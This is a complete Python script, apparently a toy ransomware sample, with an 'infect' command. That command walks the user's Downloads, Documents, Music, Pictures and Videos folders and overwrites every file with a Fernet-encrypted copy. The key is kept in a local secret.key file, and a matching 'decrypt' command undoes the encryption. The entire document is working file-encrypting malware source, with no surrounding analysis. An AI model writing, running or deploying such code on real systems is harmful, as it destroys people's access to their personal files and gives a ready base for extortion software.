#!/usr/bin/env python3

# Import all the necessary modules.
import sys
import os
from cryptography.fernet import Fernet

paths = ["Downloads/", "Documents/", "Music/", "Pictures/", "Videos/"]
files_to_exclude = [sys.argv[0], "secret.key"]
files_to_encrypt = []

def usage():
   # Print all possible arguments.
   print("Usage: python3 " + sys.argv[0] + " <argument>")
   print()
   print("Arguments:")
   print("\tinfect        encrypt all files in all the directories listed in the paths below.")
   print("\tdecrypt       decrypt all files in all the directories listed in the paths below.")
   print("\thelp          print this help message.")
   print()
   print("Paths that will be affected:")

   for path in paths:
      print("\t"+ os.path.expanduser('~') + "/" + path)

   sys.exit(0)

def add_files():
   # Walk through all directories listed in paths.
   for path in paths:
      # Because the path isn't complete, we need to complete it by adding a `~` at the beginning.
      for root, dirs, files in os.walk(os.path.expanduser('~') + "/" + path):
         for name in files:
            # We don't want to encrypt this script and the secret key, so when ever we find them, we skip them.
            if name in files_to_exclude:
               continue

            # Check if the file is a regular file.
            if os.path.isfile(os.path.join(root, name)):

               # Add the file to the list of files to encrypt.
               files_to_encrypt.append(os.path.join(root, name))

def infect():
   add_files()

   # Generate a random secret key.
   secret_key = Fernet.generate_key()

   # Write the key to a file.
   with open("secret.key", "wb") as key:
      key.write(secret_key)

   # Encrypt the files listed in the files_to_encrypt list.
   for file in files_to_encrypt:
      # Read the data from the file.
      with open(file, "rb") as f:
         data = f.read()

      # Encrypt the data.
      encrypted_data = Fernet(secret_key).encrypt(data)

      # Write the encrypted data to the file.
      with open(file, "wb") as f:
         f.write(encrypted_data)

   print("Your files are now encrypted!")
   print("run 'sudo python3 " + sys.argv[0] + " decrypt' to decrypt them.")

def decrypt():
   add_files()

   # Read the secret key from the file.
   with open("secret.key", "rb") as key:
      secret_key = key.read()

   # Decrypt the files listed in the files_to_encrypt list.
   for file in files_to_encrypt:
      # Read the data from the file.
      with open(file, "rb") as f:
         data = f.read()

      # Decrypt the data.
      decrypted_data = Fernet(secret_key).decrypt(data)

      # Write the decrypted data to the file.
      with open(file, "wb") as f:
         f.write(decrypted_data)

   print("Your files are now decrypted!")

def main():
   if len(sys.argv) < 2 or sys.argv[1] == "help":
      usage()

   if sys.argv[1] == "infect":
      infect()

   if sys.argv[1] == "decrypt":
      decrypt()

main()
